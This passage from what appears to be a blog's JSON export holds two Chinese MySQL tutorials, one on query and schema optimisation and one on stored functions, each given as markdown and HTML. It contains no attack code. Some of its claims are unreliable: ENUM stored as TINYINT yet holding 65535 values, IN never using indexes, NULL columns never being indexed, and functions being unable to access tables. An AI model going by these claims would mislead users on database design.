每张表都应该有一个字段作为主键，这个字段的类型建议使用INT类型，而不是使用UUID；\n\t\t来自互联网的测试数据表明自增主键的效率高于UUID。在1000W记录表的测试下：\n\t\t（1）普通单条或者20条左右的记录检索，自增主键效率是uuid主键的2到3倍；\n\t\t（2）但是范围查询特别是上百成千条的记录查询，自增id的效率要大于uuid；\n\t\t（3）在范围查询做统计汇总的时候，自增id主键的效率是uuid主键1.5到2倍；\n\t\t（4）在存储上面，自增id所占的存储空间是uuid的1/2；\n\t\t（5）在写入上面，自增ID主键的效率是UUID主键的3到10倍，相差比较明显，特别是update小范围之内的数据上面。\n\t\t（6）在备份恢复上，自增ID主键稍微优于UUID。\n\t- MySql分布式架构中逐渐采用INT类型，自增步长根据服务器数量决定，这样不会存在逐渐冲突；\n\t- 表中的字段为空时避免使用NULL值作为默认值；\n\t因为NULL值是未知的，且占用空间，不走索引，建表的时候最好设置字段是NOT NULL 来避免这种低效率的事情的发生。或者，将默认值设置为对应数据类型的默认值，如INT对应0，VARCHAR对应空串（‘’）。\n\t\t另外，我们需要搞清楚 \"空值\" 和\"NULL\"的区别：\n\t\t- 空值('')是不占用空间的；\n\t\t- MySQL中的NULL其实是占用空间的。\n\t\n\t- 对于多个状态字段应该使用ENUM而不是VARCHAR；\n\tENUM类型是非常快和紧凑的。在实际上，其保存的是TINYINT，可以有65535个欲存状态。但其外表上显示为字符串。这样一来，用这个字段来做一些选项列表变得相当的完美。如果你有一个字段，比如“性别”，“国家”，“民族”，“状态”或“部门”，你知道这些字段的取值是有限而且固定的，那么，你应该使用ENUM而不是VARCHAR。 \n- 索引优化：\n\n\t\t- **索引：**索引用来快速地寻找那些具有特定值的记录，所有MySQL索引都以B-树的形式保存。如果没有索引，执行查询时MySQL必须从第一个记录开始扫描整个表的所有记录，直至找到符合要求的记录。表里面的记录数量越多，这个操作的代价就越高。如果作为搜索条件的列上已经创建了索引，MySQL无需扫描任何记录即可迅速得到目标记录所在的位置。\n\t\t- **合理添加索引：**\n\t\t\t- 索引是独立于基础数据的数据库对象，因此它会占用存储空间，大量的创建索引不但不会提高查询的效率，反而会降低查询效率；\n\t\t\t- 数据新增、更新会导致索引的同步更新，所以会增加数据新增、更新所消耗的成本。因此，对于更新非常频繁的字段不适合创建索引；\n\t\t\t-  对于频繁作为查询条件的字段需要创建索引，以提高查询效率；\n\t\t\t-  唯一性太差的字段不适合单独创建索引，即使频繁作为查询条件。因为多个字段重复创建的索引没有意义。\n\n\t\t- **索引语法：**\n\t\t\t- 唯一索引\n\t\t\t\n\t\t\t\t\tALTER TABLE tableName ADD UNIQUE indexName (column);\n\t\t\t\t\tCREATE UNIQUE INDEX indexName ON tableName (column);\n\t\t\t\t\n\t\t\t- 普通索引\n\t\t\t\n\t\t\t\t\tALTER TABLE tableName ADD INDEX indexName(column);\n\t\t\t\t\tCREATE INDEX indexName ON tableName(column);\n\t\t\t\n\t\t\t- 主键索引\n\t\t\t\n\t\t\t\t\tALTER TABLE tableName ADD PRIMARY KEY (column);\n\t\t\t\n\t\t\t- 全文索引\n\t\t\t\n\t\t\t\t\tALTER TABLE tableName ADD FULLTEXT (column);\n\t\t\t\n\t\t\t- 组合索引\n\t\t\t\n\t\t\t\t\tALTER TABLE tableName ADD INDEX indexName(col1,col2,...);\n\t\t\t\t\t\n\t\t- **目标：**SQL语句的优化主要是对索引的优化。因为索引查询的速度十分快，不用扫描整张表。但是，SQL中的一些关键字会导致查询过程放弃使用索引。所以，SQL语句的优化主要是避免这些排斥索引的关键字。\n\t\t- **Tip：**使用EXPLAIN关键字可以让你知道MySQL是如何处理你的SQL语句的。这可以帮你分析你的查询语句或是表结构的性能瓶颈。 EXPLAIN的查询结果还会告诉你你的索引主键被如何利用的，你的数据表是如何被搜索和排序的...等。\n\t\t- **Join关键字：**\n\t\t使用Join集连查询的时候，确保ON关键字中两个表中Join的字段是被建过索引的。而且，这些被用来Join的字段，应该是相同的类型的。这样，MySQL内部会启动为你优化Join的SQL语句的机制。\n\t\t- **用where字句替换HAVING字句：**\n\t\t避免使用HAVING字句，因为HAVING只会在检索出所有记录之后才对结果集进行过滤，而where则是在聚合前筛选记录，如果能通过where字句限制记录的数目，那就能减少这方面的开销。HAVING中的条件一般用于聚合函数的过滤，除此之外，应该将条件写在where字句中。\n\t\t- **in和exists:**\n\t\t在in和exists中通常情况下使用EXISTS，因为in不走索引。\n\t\t- **LIKE:**\n\t\t使用like运算符的时候，“a%”将会使用索引，而“a%c”和“%a”则会使用全表扫描。\n\n- 缓存优化：\n程序中通常是根据用户的输入来动态执行SQL，这时应该尽量使用参数化SQL,这样不仅可以避免SQL注入漏洞攻击，最重要数据库会对这些参数化SQL进行预编译，这样第一次执行的时候DBMS会为这个SQL语句进行查询优化并且执行预编译，这样以后再执行这个SQL的时候就直接使用预编译的结果，这样可以大大提高执行的速度。\n\n- 架构优化：\n\t- 建立分布式数据库；\n\t- 主从复制，读写分离；\n\t- 尝试垂直拆分。根据不同的模块耦合度，将大系统大表拆成小系统小表；\n\t- 如果还不行，特别是数据量巨大的单标，做sharding，水平切分。\n\n\n​\n\n\n","source":"_posts/MySql优化.md","raw":"---\ntitle: MySql优化\ndate: 2017-09-22 14:53:18\ntags: MySql\n---\n引言：在谈到到Sql优化问题时，我非常赞同”Sql优化永无止境“这句话。\n#### MySql优化：\n\n在一些大型网站项目中，数据库的并发量往往成为了整个应用的瓶颈问题。为了提高网站的并发量，就需要提高数据库的查询效率。\n那么如何才能提高数据库的查询效率呢？这就是我今天要研究的主题：Sql优化。\n\nSql优化的几个方面：\n\n- 代码优化：\n\t- 代码中减少多次连接数据库进行查询，应该将多次查询封装成一条SQL进行查询，减少IO消耗；\n\t- 避免使用 ‘SELECT * ’，查询结果中的冗余字段会增加了IO消耗。\n\t\n- 建表优化：\n\t- 每张表都应该有一个字段作为主键，这个字段的类型建议使用INT类型，而不是使用UUID；\n\t\t来自互联网的测试数据表明自增主键的效率高于UUID。在1000W记录表的测试下：\n\t\t（1）普通单条或者20条左右的记录检索，自增主键效率是uuid主键的2到3倍；\n\t\t（2）但是范围查询特别是上百成千条的记录查询，自增id的效率要大于uuid；\n\t\t（3）在范围查询做统计汇总的时候，自增id主键的效率是uuid主键1.5到2倍；\n\t\t（4）在存储上面，自增id所占的存储空间是uuid的1/2；\n\t\t（5）在写入上面，自增ID主键的效率是UUID主键的3到10倍，相差比较明显，特别是update小范围之内的数据上面。\n\t\t（6）在备份恢复上，自增ID主键稍微优于UUID。\n\t- MySql分布式架构中逐渐采用INT类型，自增步长根据服务器数量决定，这样不会存在逐渐冲突；\n\t- 表中的字段为空时避免使用NULL值作为默认值；\n\t因为NULL值是未知的，且占用空间，不走索引，建表的时候最好设置字段是NOT NULL 来避免这种低效率的事情的发生。或者，将默认值设置为对应数据类型的默认值，如INT对应0，VARCHAR对应空串（‘’）。\n\t\t另外，我们需要搞清楚 \"空值\" 和\"NULL\"的区别：\n\t\t- 空值('')是不占用空间的；\n\t\t- MySQL中的NULL其实是占用空间的。\n\t\n\t- 对于多个状态字段应该使用ENUM而不是VARCHAR；\n\tENUM类型是非常快和紧凑的。在实际上，其保存的是TINYINT，可以有65535个欲存状态。但其外表上显示为字符串。这样一来，用这个字段来做一些选项列表变得相当的完美。如果你有一个字段，比如“性别”，“国家”，“民族”，“状态”或“部门”，你知道这些字段的取值是有限而且固定的，那么，你应该使用ENUM而不是VARCHAR。 \n- 索引优化：\n\n\t\t- **索引：**索引用来快速地寻找那些具有特定值的记录，所有MySQL索引都以B-树的形式保存。如果没有索引，执行查询时MySQL必须从第一个记录开始扫描整个表的所有记录，直至找到符合要求的记录。表里面的记录数量越多，这个操作的代价就越高。如果作为搜索条件的列上已经创建了索引，MySQL无需扫描任何记录即可迅速得到目标记录所在的位置。\n\t\t- **合理添加索引：**\n\t\t\t- 索引是独立于基础数据的数据库对象，因此它会占用存储空间，大量的创建索引不但不会提高查询的效率，反而会降低查询效率；\n\t\t\t- 数据新增、更新会导致索引的同步更新，所以会增加数据新增、更新所消耗的成本。因此，对于更新非常频繁的字段不适合创建索引；\n\t\t\t-  对于频繁作为查询条件的字段需要创建索引，以提高查询效率；\n\t\t\t-  唯一性太差的字段不适合单独创建索引，即使频繁作为查询条件。因为多个字段重复创建的索引没有意义。\n\n\t\t- **索引语法：**\n\t\t\t- 唯一索引\n\t\t\t\n\t\t\t\t\tALTER TABLE tableName ADD UNIQUE indexName (column);\n\t\t\t\t\tCREATE UNIQUE INDEX indexName ON tableName (column);\n\t\t\t\t\n\t\t\t- 普通索引\n\t\t\t\n\t\t\t\t\tALTER TABLE tableName ADD INDEX indexName(column);\n\t\t\t\t\tCREATE INDEX indexName ON tableName(column);\n\t\t\t\n\t\t\t- 主键索引\n\t\t\t\n\t\t\t\t\tALTER TABLE tableName ADD PRIMARY KEY (column);\n\t\t\t\n\t\t\t- 全文索引\n\t\t\t\n\t\t\t\t\tALTER TABLE tableName ADD FULLTEXT (column);\n\t\t\t\n\t\t\t- 组合索引\n\t\t\t\n\t\t\t\t\tALTER TABLE tableName ADD INDEX indexName(col1,col2,...);\n\t\t\t\t\t\n\t\t- **目标：**SQL语句的优化主要是对索引的优化。因为索引查询的速度十分快，不用扫描整张表。但是，SQL中的一些关键字会导致查询过程放弃使用索引。所以，SQL语句的优化主要是避免这些排斥索引的关键字。\n\t\t- **Tip：**使用EXPLAIN关键字可以让你知道MySQL是如何处理你的SQL语句的。这可以帮你分析你的查询语句或是表结构的性能瓶颈。 EXPLAIN的查询结果还会告诉你你的索引主键被如何利用的，你的数据表是如何被搜索和排序的...等。\n\t\t- **Join关键字：**\n\t\t使用Join集连查询的时候，确保ON关键字中两个表中Join的字段是被建过索引的。而且，这些被用来Join的字段，应该是相同的类型的。这样，MySQL内部会启动为你优化Join的SQL语句的机制。\n\t\t- **用where字句替换HAVING字句：**\n\t\t避免使用HAVING字句，因为HAVING只会在检索出所有记录之后才对结果集进行过滤，而where则是在聚合前筛选记录，如果能通过where字句限制记录的数目，那就能减少这方面的开销。HAVING中的条件一般用于聚合函数的过滤，除此之外，应该将条件写在where字句中。\n\t\t- **in和exists:**\n\t\t在in和exists中通常情况下使用EXISTS，因为in不走索引。\n\t\t- **LIKE:**\n\t\t使用like运算符的时候，“a%”将会使用索引，而“a%c”和“%a”则会使用全表扫描。\n\n- 缓存优化：\n程序中通常是根据用户的输入来动态执行SQL，这时应该尽量使用参数化SQL,这样不仅可以避免SQL注入漏洞攻击，最重要数据库会对这些参数化SQL进行预编译，这样第一次执行的时候DBMS会为这个SQL语句进行查询优化并且执行预编译，这样以后再执行这个SQL的时候就直接使用预编译的结果，这样可以大大提高执行的速度。\n\n- 架构优化：\n\t- 建立分布式数据库；\n\t- 主从复制，读写分离；\n\t- 尝试垂直拆分。根据不同的模块耦合度，将大系统大表拆成小系统小表；\n\t- 如果还不行，特别是数据量巨大的单标，做sharding，水平切分。\n\n\n​\n\n\n","slug":"MySql优化","published":1,"updated":"2018-02-09T05:41:44.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tw60018mfahqmhv4shs","content":"<p>引言：在谈到到Sql优化问题时，我非常赞同”Sql优化永无止境“这句话。</p>\n<h4 id=\"MySql优化：\"><a href=\"#MySql优化：\" class=\"headerlink\" title=\"MySql优化：\"></a>MySql优化：</h4><p>在一些大型网站项目中，数据库的并发量往往成为了整个应用的瓶颈问题。为了提高网站的并发量，就需要提高数据库的查询效率。<br>那么如何才能提高数据库的查询效率呢？这就是我今天要研究的主题：Sql优化。</p>\n<p>Sql优化的几个方面：</p>\n<ul>\n<li><p>代码优化：</p>\n<ul>\n<li>代码中减少多次连接数据库进行查询，应该将多次查询封装成一条SQL进行查询，减少IO消耗；</li>\n<li>避免使用 ‘SELECT * ’，查询结果中的冗余字段会增加了IO消耗。</li>\n</ul>\n</li>\n<li><p>建表优化：</p>\n<ul>\n<li>每张表都应该有一个字段作为主键，这个字段的类型建议使用INT类型，而不是使用UUID；<br>  来自互联网的测试数据表明自增主键的效率高于UUID。在1000W记录表的测试下：<br>  （1）普通单条或者20条左右的记录检索，自增主键效率是uuid主键的2到3倍；<br>  （2）但是范围查询特别是上百成千条的记录查询，自增id的效率要大于uuid；<br>  （3）在范围查询做统计汇总的时候，自增id主键的效率是uuid主键1.5到2倍；<br>  （4）在存储上面，自增id所占的存储空间是uuid的1/2；<br>  （5）在写入上面，自增ID主键的效率是UUID主键的3到10倍，相差比较明显，特别是update小范围之内的数据上面。<br>  （6）在备份恢复上，自增ID主键稍微优于UUID。</li>\n<li>MySql分布式架构中逐渐采用INT类型，自增步长根据服务器数量决定，这样不会存在逐渐冲突；</li>\n<li><p>表中的字段为空时避免使用NULL值作为默认值；<br>因为NULL值是未知的，且占用空间，不走索引，建表的时候最好设置字段是NOT NULL 来避免这种低效率的事情的发生。或者，将默认值设置为对应数据类型的默认值，如INT对应0，VARCHAR对应空串（‘’）。<br>  另外，我们需要搞清楚 “空值” 和”NULL”的区别：</p>\n<ul>\n<li>空值(‘’)是不占用空间的；</li>\n<li>MySQL中的NULL其实是占用空间的。</li>\n</ul>\n</li>\n<li><p>对于多个状态字段应该使用ENUM而不是VARCHAR；<br>ENUM类型是非常快和紧凑的。在实际上，其保存的是TINYINT，可以有65535个欲存状态。但其外表上显示为字符串。这样一来，用这个字段来做一些选项列表变得相当的完美。如果你有一个字段，比如“性别”，“国家”，“民族”，“状态”或“部门”，你知道这些字段的取值是有限而且固定的，那么，你应该使用ENUM而不是VARCHAR。 </p>\n</li>\n</ul>\n</li>\n<li><p>索引优化：</p>\n<pre><code>- **索引：**索引用来快速地寻找那些具有特定值的记录，所有MySQL索引都以B-树的形式保存。如果没有索引，执行查询时MySQL必须从第一个记录开始扫描整个表的所有记录，直至找到符合要求的记录。表里面的记录数量越多，这个操作的代价就越高。如果作为搜索条件的列上已经创建了索引，MySQL无需扫描任何记录即可迅速得到目标记录所在的位置。\n- **合理添加索引：**\n    - 索引是独立于基础数据的数据库对象，因此它会占用存储空间，大量的创建索引不但不会提高查询的效率，反而会降低查询效率；\n    - 数据新增、更新会导致索引的同步更新，所以会增加数据新增、更新所消耗的成本。因此，对于更新非常频繁的字段不适合创建索引；\n    -  对于频繁作为查询条件的字段需要创建索引，以提高查询效率；\n    -  唯一性太差的字段不适合单独创建索引，即使频繁作为查询条件。因为多个字段重复创建的索引没有意义。\n\n- **索引语法：**\n    - 唯一索引\n\n            ALTER TABLE tableName ADD UNIQUE indexName (column);\n            CREATE UNIQUE INDEX indexName ON tableName (column);\n\n    - 普通索引\n\n            ALTER TABLE tableName ADD INDEX indexName(column);\n            CREATE INDEX indexName ON tableName(column);\n\n    - 主键索引\n\n            ALTER TABLE tableName ADD PRIMARY KEY (column);\n\n    - 全文索引\n\n            ALTER TABLE tableName ADD FULLTEXT (column);\n\n    - 组合索引\n\n            ALTER TABLE tableName ADD INDEX indexName(col1,col2,...);\n\n- **目标：**SQL语句的优化主要是对索引的优化。因为索引查询的速度十分快，不用扫描整张表。但是，SQL中的一些关键字会导致查询过程放弃使用索引。所以，SQL语句的优化主要是避免这些排斥索引的关键字。\n- **Tip：**使用EXPLAIN关键字可以让你知道MySQL是如何处理你的SQL语句的。这可以帮你分析你的查询语句或是表结构的性能瓶颈。 EXPLAIN的查询结果还会告诉你你的索引主键被如何利用的，你的数据表是如何被搜索和排序的...等。\n- **Join关键字：**\n使用Join集连查询的时候，确保ON关键字中两个表中Join的字段是被建过索引的。而且，这些被用来Join的字段，应该是相同的类型的。这样，MySQL内部会启动为你优化Join的SQL语句的机制。\n- **用where字句替换HAVING字句：**\n避免使用HAVING字句，因为HAVING只会在检索出所有记录之后才对结果集进行过滤，而where则是在聚合前筛选记录，如果能通过where字句限制记录的数目，那就能减少这方面的开销。HAVING中的条件一般用于聚合函数的过滤，除此之外，应该将条件写在where字句中。\n- **in和exists:**\n在in和exists中通常情况下使用EXISTS，因为in不走索引。\n- **LIKE:**\n使用like运算符的时候，“a%”将会使用索引，而“a%c”和“%a”则会使用全表扫描。\n</code></pre></li>\n<li><p>缓存优化：<br>程序中通常是根据用户的输入来动态执行SQL，这时应该尽量使用参数化SQL,这样不仅可以避免SQL注入漏洞攻击，最重要数据库会对这些参数化SQL进行预编译，这样第一次执行的时候DBMS会为这个SQL语句进行查询优化并且执行预编译，这样以后再执行这个SQL的时候就直接使用预编译的结果，这样可以大大提高执行的速度。</p>\n</li>\n<li><p>架构优化：</p>\n<ul>\n<li>建立分布式数据库；</li>\n<li>主从复制，读写分离；</li>\n<li>尝试垂直拆分。根据不同的模块耦合度，将大系统大表拆成小系统小表；</li>\n<li>如果还不行，特别是数据量巨大的单标，做sharding，水平切分。</li>\n</ul>\n</li>\n</ul>\n<p>​</p>\n","site":{"data":{}},"excerpt":"","more":"<p>引言：在谈到到Sql优化问题时，我非常赞同”Sql优化永无止境“这句话。</p>\n<h4 id=\"MySql优化：\"><a href=\"#MySql优化：\" class=\"headerlink\" title=\"MySql优化：\"></a>MySql优化：</h4><p>在一些大型网站项目中，数据库的并发量往往成为了整个应用的瓶颈问题。为了提高网站的并发量，就需要提高数据库的查询效率。<br>那么如何才能提高数据库的查询效率呢？这就是我今天要研究的主题：Sql优化。</p>\n<p>Sql优化的几个方面：</p>\n<ul>\n<li><p>代码优化：</p>\n<ul>\n<li>代码中减少多次连接数据库进行查询，应该将多次查询封装成一条SQL进行查询，减少IO消耗；</li>\n<li>避免使用 ‘SELECT * ’，查询结果中的冗余字段会增加了IO消耗。</li>\n</ul>\n</li>\n<li><p>建表优化：</p>\n<ul>\n<li>每张表都应该有一个字段作为主键，这个字段的类型建议使用INT类型，而不是使用UUID；<br>  来自互联网的测试数据表明自增主键的效率高于UUID。在1000W记录表的测试下：<br>  （1）普通单条或者20条左右的记录检索，自增主键效率是uuid主键的2到3倍；<br>  （2）但是范围查询特别是上百成千条的记录查询，自增id的效率要大于uuid；<br>  （3）在范围查询做统计汇总的时候，自增id主键的效率是uuid主键1.5到2倍；<br>  （4）在存储上面，自增id所占的存储空间是uuid的1/2；<br>  （5）在写入上面，自增ID主键的效率是UUID主键的3到10倍，相差比较明显，特别是update小范围之内的数据上面。<br>  （6）在备份恢复上，自增ID主键稍微优于UUID。</li>\n<li>MySql分布式架构中逐渐采用INT类型，自增步长根据服务器数量决定，这样不会存在逐渐冲突；</li>\n<li><p>表中的字段为空时避免使用NULL值作为默认值；<br>因为NULL值是未知的，且占用空间，不走索引，建表的时候最好设置字段是NOT NULL 来避免这种低效率的事情的发生。或者，将默认值设置为对应数据类型的默认值，如INT对应0，VARCHAR对应空串（‘’）。<br>  另外，我们需要搞清楚 “空值” 和”NULL”的区别：</p>\n<ul>\n<li>空值(‘’)是不占用空间的；</li>\n<li>MySQL中的NULL其实是占用空间的。</li>\n</ul>\n</li>\n<li><p>对于多个状态字段应该使用ENUM而不是VARCHAR；<br>ENUM类型是非常快和紧凑的。在实际上，其保存的是TINYINT，可以有65535个欲存状态。但其外表上显示为字符串。这样一来，用这个字段来做一些选项列表变得相当的完美。如果你有一个字段，比如“性别”，“国家”，“民族”，“状态”或“部门”，你知道这些字段的取值是有限而且固定的，那么，你应该使用ENUM而不是VARCHAR。 </p>\n</li>\n</ul>\n</li>\n<li><p>索引优化：</p>\n<pre><code>- **索引：**索引用来快速地寻找那些具有特定值的记录，所有MySQL索引都以B-树的形式保存。如果没有索引，执行查询时MySQL必须从第一个记录开始扫描整个表的所有记录，直至找到符合要求的记录。表里面的记录数量越多，这个操作的代价就越高。如果作为搜索条件的列上已经创建了索引，MySQL无需扫描任何记录即可迅速得到目标记录所在的位置。\n- **合理添加索引：**\n    - 索引是独立于基础数据的数据库对象，因此它会占用存储空间，大量的创建索引不但不会提高查询的效率，反而会降低查询效率；\n    - 数据新增、更新会导致索引的同步更新，所以会增加数据新增、更新所消耗的成本。因此，对于更新非常频繁的字段不适合创建索引；\n    -  对于频繁作为查询条件的字段需要创建索引，以提高查询效率；\n    -  唯一性太差的字段不适合单独创建索引，即使频繁作为查询条件。因为多个字段重复创建的索引没有意义。\n\n- **索引语法：**\n    - 唯一索引\n\n            ALTER TABLE tableName ADD UNIQUE indexName (column);\n            CREATE UNIQUE INDEX indexName ON tableName (column);\n\n    - 普通索引\n\n            ALTER TABLE tableName ADD INDEX indexName(column);\n            CREATE INDEX indexName ON tableName(column);\n\n    - 主键索引\n\n            ALTER TABLE tableName ADD PRIMARY KEY (column);\n\n    - 全文索引\n\n            ALTER TABLE tableName ADD FULLTEXT (column);\n\n    - 组合索引\n\n            ALTER TABLE tableName ADD INDEX indexName(col1,col2,...);\n\n- **目标：**SQL语句的优化主要是对索引的优化。因为索引查询的速度十分快，不用扫描整张表。但是，SQL中的一些关键字会导致查询过程放弃使用索引。所以，SQL语句的优化主要是避免这些排斥索引的关键字。\n- **Tip：**使用EXPLAIN关键字可以让你知道MySQL是如何处理你的SQL语句的。这可以帮你分析你的查询语句或是表结构的性能瓶颈。 EXPLAIN的查询结果还会告诉你你的索引主键被如何利用的，你的数据表是如何被搜索和排序的...等。\n- **Join关键字：**\n使用Join集连查询的时候，确保ON关键字中两个表中Join的字段是被建过索引的。而且，这些被用来Join的字段，应该是相同的类型的。这样，MySQL内部会启动为你优化Join的SQL语句的机制。\n- **用where字句替换HAVING字句：**\n避免使用HAVING字句，因为HAVING只会在检索出所有记录之后才对结果集进行过滤，而where则是在聚合前筛选记录，如果能通过where字句限制记录的数目，那就能减少这方面的开销。HAVING中的条件一般用于聚合函数的过滤，除此之外，应该将条件写在where字句中。\n- **in和exists:**\n在in和exists中通常情况下使用EXISTS，因为in不走索引。\n- **LIKE:**\n使用like运算符的时候，“a%”将会使用索引，而“a%c”和“%a”则会使用全表扫描。\n</code></pre></li>\n<li><p>缓存优化：<br>程序中通常是根据用户的输入来动态执行SQL，这时应该尽量使用参数化SQL,这样不仅可以避免SQL注入漏洞攻击，最重要数据库会对这些参数化SQL进行预编译，这样第一次执行的时候DBMS会为这个SQL语句进行查询优化并且执行预编译，这样以后再执行这个SQL的时候就直接使用预编译的结果，这样可以大大提高执行的速度。</p>\n</li>\n<li><p>架构优化：</p>\n<ul>\n<li>建立分布式数据库；</li>\n<li>主从复制，读写分离；</li>\n<li>尝试垂直拆分。根据不同的模块耦合度，将大系统大表拆成小系统小表；</li>\n<li>如果还不行，特别是数据量巨大的单标，做sharding，水平切分。</li>\n</ul>\n</li>\n</ul>\n<p>​</p>\n"},{"title":"MySql存储函数入门教程","date":"2017-12-19T05:45:37.000Z","_content":"[TOC]\n#### 什么是存储函数\n存储函数和存储过程相似，都是用一个事务进行管理的多条SQL语句的集合。\n#### 存储函数的定义\n\n\tDROP FUNCTION IF EXISTS funName; -- 便于修改存储函数，非必须\n\tCREATE FUNCTION funName(param 参数类型)\n\t  RETURNS 返回值类型\n\t  BEGIN\n\t    RETURN 1; -- 返回值\n\t  END;\n\t\n#### 存储函数的调用\n\t-- 直接调用 SELECT 存储函数名(参数)\n\tSELECT fun(\"param\")\n\t\n\t-- 作为查询条件调用\n\tSELECT * FROM user WHERE id = findId(\"param\")\n#### 存储过程中的语法\n\n- 流控制（Flow-of-control）语句(IF，CASE，WHILE，LOOP，WHILE，REPEAT，LEAVE，ITERATE)也是合法的。\n- 变量声明(DECLARE)以及指派(SET)是合法的. \n- 允许条件声明. \n- 异常处理声明也是允许的. \n- 但是在这里要记住函数有受限条件:不能在函数中访问表\n#### 存储函数与存储过程的区别\n\n- 存储函数有且只有一个返回值，而存储过程不能有返回值；\n- 函数只能有输入参数，而且不能带in, 而存储过程可以有多个in,out,inout参数；\n- 存储过程中的语句功能更强大，存储过程可以实现很复杂的业务逻辑，而函数有很多限制，如不能在函数中使用insert,update,delete,create等语句；存储函数只完成查询的工作，可接受输入参数并返回一个结果，也就是函数实现的功能针对性比较强；\n- 存储过程可以调用存储函数。但函数不能调用存储过程；\n- 存储过程一般是作为一个独立的部分来执行(call调用)。而函数可以作为查询语句的一个部分来调用。","source":"_posts/MySql存储函数入门教程.md","raw":"---\ntitle: MySql存储函数入门教程\ndate: 2017-12-19 13:45:37\ntags: MySql\n---\n[TOC]\n#### 什么是存储函数\n存储函数和存储过程相似，都是用一个事务进行管理的多条SQL语句的集合。\n#### 存储函数的定义\n\n\tDROP FUNCTION IF EXISTS funName; -- 便于修改存储函数，非必须\n\tCREATE FUNCTION funName(param 参数类型)\n\t  RETURNS 返回值类型\n\t  BEGIN\n\t    RETURN 1; -- 返回值\n\t  END;\n\t\n#### 存储函数的调用\n\t-- 直接调用 SELECT 存储函数名(参数)\n\tSELECT fun(\"param\")\n\t\n\t-- 作为查询条件调用\n\tSELECT * FROM user WHERE id = findId(\"param\")\n#### 存储过程中的语法\n\n- 流控制（Flow-of-control）语句(IF，CASE，WHILE，LOOP，WHILE，REPEAT，LEAVE，ITERATE)也是合法的。\n- 变量声明(DECLARE)以及指派(SET)是合法的. \n- 允许条件声明. \n- 异常处理声明也是允许的. \n- 但是在这里要记住函数有受限条件:不能在函数中访问表\n#### 存储函数与存储过程的区别\n\n- 存储函数有且只有一个返回值，而存储过程不能有返回值；\n- 函数只能有输入参数，而且不能带in, 而存储过程可以有多个in,out,inout参数；\n- 存储过程中的语句功能更强大，存储过程可以实现很复杂的业务逻辑，而函数有很多限制，如不能在函数中使用insert,update,delete,create等语句；存储函数只完成查询的工作，可接受输入参数并返回一个结果，也就是函数实现的功能针对性比较强；\n- 存储过程可以调用存储函数。但函数不能调用存储过程；\n- 存储过程一般是作为一个独立的部分来执行(call调用)。而函数可以作为查询语句的一个部分来调用。","slug":"MySql存储函数入门教程","published":1,"updated":"2018-02-09T06:09:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tw7001amfahmyazk7pf","content":"<p>[TOC]</p>\n<h4 id=\"什么是存储函数\"><a href=\"#什么是存储函数\" class=\"headerlink\" title=\"什么是存储函数\"></a>什么是存储函数</h4><p>存储函数和存储过程相似，都是用一个事务进行管理的多条SQL语句的集合。</p>\n<h4 id=\"存储函数的定义\"><a href=\"#存储函数的定义\" class=\"headerlink\" title=\"存储函数的定义\"></a>存储函数的定义</h4><pre><code>DROP FUNCTION IF EXISTS funName; -- 便于修改存储函数，非必须\nCREATE FUNCTION funName(param 参数类型)\n  RETURNS 返回值类型\n  BEGIN\n    RETURN 1; -- 返回值\n  END;\n</code></pre><h4 id=\"存储函数的调用\"><a href=\"#存储函数的调用\" class=\"headerlink\" title=\"存储函数的调用\"></a>存储函数的调用</h4><pre><code>-- 直接调用 SELECT 存储函数名(参数)\nSELECT fun(&quot;param&quot;)\n\n-- 作为查询条件调用\nSELECT * FROM user WHERE id = findId(&quot;param&quot;)\n</code></pre><h4 id=\"存储过程中的语法\"><a href=\"#存储过程中的语法\" class=\"headerlink\" title=\"存储过程中的语法\"></a>存储过程中的语法</h4><ul>\n<li>流控制（Flow-of-control）语句(IF，CASE，WHILE，LOOP，WHILE，REPEAT，LEAVE，ITERATE)也是合法的。</li>\n<li>变量声明(DECLARE)以及指派(SET)是合法的. </li>\n<li>允许条件声明. </li>\n<li>异常处理声明也是允许的. </li>\n<li><p>但是在这里要记住函数有受限条件:不能在函数中访问表</p>\n<h4 id=\"存储函数与存储过程的区别\"><a href=\"#存储函数与存储过程的区别\" class=\"headerlink\" title=\"存储函数与存储过程的区别\"></a>存储函数与存储过程的区别</h4></li>\n<li><p>存储函数有且只有一个返回值，而存储过程不能有返回值；</p>\n</li>\n<li>函数只能有输入参数，而且不能带in, 而存储过程可以有多个in,out,inout参数；</li>\n<li>存储过程中的语句功能更强大，存储过程可以实现很复杂的业务逻辑，而函数有很多限制，如不能在函数中使用insert,update,delete,create等语句；存储函数只完成查询的工作，可接受输入参数并返回一个结果，也就是函数实现的功能针对性比较强；</li>\n<li>存储过程可以调用存储函数。但函数不能调用存储过程；</li>\n<li>存储过程一般是作为一个独立的部分来执行(call调用)。而函数可以作为查询语句的一个部分来调用。</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<p>[TOC]</p>\n<h4 id=\"什么是存储函数\"><a href=\"#什么是存储函数\" class=\"headerlink\" title=\"什么是存储函数\"></a>什么是存储函数</h4><p>存储函数和存储过程相似，都是用一个事务进行管理的多条SQL语句的集合。</p>\n<h4 id=\"存储函数的定义\"><a href=\"#存储函数的定义\" class=\"headerlink\" title=\"存储函数的定义\"></a>存储函数的定义</h4><pre><code>DROP FUNCTION IF EXISTS funName; -- 便于修改存储函数，非必须\nCREATE FUNCTION funName(param 参数类型)\n  RETURNS 返回值类型\n  BEGIN\n    RETURN 1; -- 返回值\n  END;\n</code></pre><h4 id=\"存储函数的调用\"><a href=\"#存储函数的调用\" class=\"headerlink\" title=\"存储函数的调用\"></a>存储函数的调用</h4><pre><code>-- 直接调用 SELECT 存储函数名(参数)\nSELECT fun(&quot;param&quot;)\n\n-- 作为查询条件调用\nSELECT * FROM user WHERE id = findId(&quot;param&quot;)\n</code></pre><h4 id=\"存储过程中的语法\"><a href=\"#存储过程中的语法\" class=\"headerlink\" title=\"存储过程中的语法\"></a>存储过程中的语法</h4><ul>\n<li>流控制（Flow-of-control）语句(IF，CASE，WHILE，LOOP，WHILE，REPEAT，LEAVE，ITERATE)也是合法的。</li>\n<li>变量声明(DECLARE)以及指派(SET)是合法的. </li>\n<li>允许条件声明. </li>\n<li>异常处理声明也是允许的. </li>\n<li><p>但是在这里要记住函数有受限条件:不能在函数中访问表</p>\n<h4 id=\"存储函数与存储过程的区别\"><a href=\"#存储函数与存储过程的区别\" class=\"headerlink\" 